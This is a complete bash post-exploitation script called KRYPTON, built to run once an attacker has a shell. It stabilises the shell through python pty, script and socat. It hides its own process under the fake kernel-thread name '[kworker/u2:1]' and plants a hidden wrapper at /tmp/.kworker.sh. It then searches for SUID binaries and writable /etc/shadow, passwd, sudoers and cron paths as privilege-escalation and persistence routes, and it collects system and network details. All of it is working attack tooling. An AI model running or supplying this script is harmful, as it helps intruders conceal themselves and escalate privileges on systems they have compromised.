#!/bin/bash

# KRYPTON - Autonomous Stabilization & Discovery Script
# Executes immediately upon shell connection for TTY upgrade, privilege discovery, and process masking

# Color output for visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Print banner
print_banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                                                              ║"
    echo "║         KRYPTON - Autonomous Stabilization & Discovery       ║"
    echo "║                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# TTY Upgrade function
upgrade_tty() {
    echo -e "${YELLOW}[+]${NC} Attempting TTY upgrade..."
    echo ""
    
    # Method 1: Python pty
    if command -v python &> /dev/null; then
        echo -e "${GREEN}[*]${NC} Python detected, attempting Python TTY upgrade..."
        python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓]${NC} Python TTY upgrade successful"
            return 0
        fi
    fi
    
    # Method 2: Python3 pty
    if command -v python3 &> /dev/null; then
        echo -e "${GREEN}[*]${NC} Python3 detected, attempting Python3 TTY upgrade..."
        python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓]${NC} Python3 TTY upgrade successful"
            return 0
        fi
    fi
    
    # Method 3: script command
    if command -v script &> /dev/null; then
        echo -e "${GREEN}[*]${NC} Script command detected, attempting script TTY upgrade..."
        script -q /dev/null bash 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓]${NC} Script TTY upgrade successful"
            return 0
        fi
    fi
    
    # Method 4: socat
    if command -v socat &> /dev/null; then
        echo -e "${GREEN}[*]${NC} Socat detected, attempting socat TTY upgrade..."
        socat file:`tty`,raw,echo=0 exec:'bash',pty,stderr,setsid,sigint,sane 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓]${NC} Socat TTY upgrade successful"
            return 0
        fi
    fi
    
    echo -e "${RED}[✗]${NC} TTY upgrade failed - no suitable method found"
    return 1
}

# Set terminal settings for better interaction
set_terminal() {
    echo -e "${YELLOW}[+]${NC} Configuring terminal settings..."
    export TERM=xterm-256color
    stty -echo raw
    stty rows 50 cols 200
    echo -e "${GREEN}[✓]${NC} Terminal configured"
}

# Process masking function
mask_process() {
    echo ""
    echo -e "${YELLOW}[+]${NC} Attempting process masking..."
    
    # Method 1: Using exec to rename process
    if [ -x /bin/bash ]; then
        echo -e "${GREEN}[*]${NC} Using exec to rename process to [kworker/u2:1]..."
        exec -a "[kworker/u2:1]" bash -c "
            echo -e '${GREEN}[✓]${NC} Process masked as [kworker/u2:1]'
            # Continue with the rest of the script
        " &
        MASK_PID=$!
        echo -e "${GREEN}[✓]${NC} Process masking initiated (PID: $MASK_PID)"
    fi
    
    # Method 2: Using Perl to rename process
    if command -v perl &> /dev/null; then
        echo -e "${GREEN}[*]${NC} Using Perl to rename process..."
        perl -e '\$0=\"[kworker/u2:1]\"; sleep 1;' &
        echo -e "${GREEN}[✓]${NC} Perl process masking initiated"
    fi
    
    # Method 3: Create a wrapper script
    echo -e "${GREEN}[*]${NC} Creating process wrapper..."
    cat > /tmp/.kworker.sh << 'EOF'
#!/bin/bash
exec -a "[kworker/u2:1]" bash "$@"
EOF
    chmod +x /tmp/.kworker.sh
    echo -e "${GREEN}[✓]${NC} Process wrapper created at /tmp/.kworker.sh"
}

# SUID binary discovery
discover_suid() {
    echo ""
    echo -e "${YELLOW}[+]${NC} Scanning for SUID binaries..."
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    SUID_FILES=$(find / -perm -4000 -type f 2>/dev/null)
    
    if [ -n "$SUID_FILES" ]; then
        echo -e "${GREEN}[✓]${NC} Found SUID binaries:"
        echo ""
        echo -e "${MAGENTA}$SUID_FILES${NC}"
        echo ""
        
        # Check for interesting SUID binaries
        INTERESTING=$(echo "$SUID_FILES" | grep -E "(nmap|vim|nano|less|more|cp|mv|find|python|perl|ruby|bash|sh|socat|netcat|nc)" 2>/dev/null)
        if [ -n "$INTERESTING" ]; then
            echo -e "${YELLOW}[!]${NC} Interesting SUID binaries found (potential privilege escalation):"
            echo -e "${RED}$INTERESTING${NC}"
        fi
    else
        echo -e "${RED}[✗]${NC} No SUID binaries found"
    fi
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# Check writable critical files
check_writable_files() {
    echo ""
    echo -e "${YELLOW}[+]${NC} Checking for writable critical files..."
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    # Check /etc/shadow
    if [ -w /etc/shadow ]; then
        echo -e "${RED}[!!!]${NC} ${RED}/etc/shadow is WRITABLE${NC} - CRITICAL PRIVILEGE ESCALATION VECTOR"
    else
        echo -e "${GREEN}[✓]${NC} /etc/shadow is not writable"
    fi
    
    # Check /etc/passwd
    if [ -w /etc/passwd ]; then
        echo -e "${RED}[!!!]${NC} ${RED}/etc/passwd is WRITABLE${NC} - CRITICAL PRIVILEGE ESCALATION VECTOR"
    else
        echo -e "${GREEN}[✓]${NC} /etc/passwd is not writable"
    fi
    
    # Check /etc/sudoers
    if [ -w /etc/sudoers ]; then
        echo -e "${RED}[!!!]${NC} ${RED}/etc/sudoers is WRITABLE${NC} - CRITICAL PRIVILEGE ESCALATION VECTOR"
    else
        echo -e "${GREEN}[✓]${NC} /etc/sudoers is not writable"
    fi
    
    # Check cron directories
    if [ -w /etc/cron.d ]; then
        echo -e "${YELLOW}[!]${NC} /etc/cron.d is writable - potential persistence vector"
    fi
    
    if [ -w /var/spool/cron/crontabs ]; then
        echo -e "${YELLOW}[!]${NC} /var/spool/cron/crontabs is writable - potential persistence vector"
    fi
    
    if [ -w /var/spool/cron ]; then
        echo -e "${YELLOW}[!]${NC} /var/spool/cron is writable - potential persistence vector"
    fi
    
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# Current user and privilege check
check_privileges() {
    echo ""
    echo -e "${YELLOW}[+]${NC} Checking current privileges..."
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    CURRENT_USER=$(whoami)
    echo -e "${GREEN}[*]${NC} Current user: ${MAGENTA}$CURRENT_USER${NC}"
    
    if [ "$CURRENT_USER" = "root" ]; then
        echo -e "${RED}[!!!]${NC} Running as ROOT - Full system access"
    fi
    
    # Check sudo access
    if command -v sudo &> /dev/null; then
        echo -e "${GREEN}[*]${NC} Sudo is installed"
        sudo -n true 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${RED}[!!!]${NC} User has passwordless sudo access"
        fi
    fi
    
    # Check groups
    echo -e "${GREEN}[*]${NC} User groups:"
    groups
    echo ""
    
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# System information gathering
gather_system_info() {
    echo ""
    echo -e "${YELLOW}[+]${NC} Gathering system information..."
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    echo -e "${GREEN}[*]${NC} Kernel version:"
    uname -a
    
    echo -e "${GREEN}[*]${NC} Distribution:"
    if [ -f /etc/os-release ]; then
        cat /etc/os-release | grep -E "^(NAME|VERSION)="
    elif [ -f /etc/lsb-release ]; then
        cat /etc/lsb-release | grep -E "^(DISTRIB_ID|DISTRIB_RELEASE)="
    fi
    
    echo -e "${GREEN}[*]${NC} Hostname:"
    hostname
    
    echo -e "${GREEN}[*]${NC} Current directory:"
    pwd
    
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# Network information
gather_network_info() {
    echo ""
    echo -e "${YELLOW}[+]${NC} Gathering network information..."
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    echo -e "${GREEN}[*]${NC} Network interfaces:"
    ip a 2>/dev/null || ifconfig 2>/dev/null
    
    echo -e "${GREEN}[*]${NC} Routing table:"
    ip route 2>/dev/null || route -n 2>/dev/null
    
    echo -e "${GREEN}[*]${NC} Active connections:"
    ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
    
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# Main execution
main() {
    print_banner
    echo ""
    
    # Step 1: TTY Upgrade
    upgrade_tty
    echo ""
    
    # Step 2: Set terminal settings
    set_terminal
    echo ""
    
    # Step 3: Process masking
    mask_process
    
    # Step 4: Privilege discovery
    check_privileges
    
    # Step 5: SUID discovery
    discover_suid
    
    # Step 6: Writable files check
    check_writable_files
    
    # Step 7: System information
    gather_system_info
    
    # Step 8: Network information
    gather_network_info
    
    echo ""
    echo -e "${GREEN}[✓]${NC} Stabilization & Discovery complete"
    echo ""
    echo -e "${YELLOW}[i]${NC} You now have a stable shell. Process is masked as [kworker/u2:1]"
    echo -e "${YELLOW}[i]${NC} Review the output above for privilege escalation vectors"
    echo ""
}

# Run main function
main
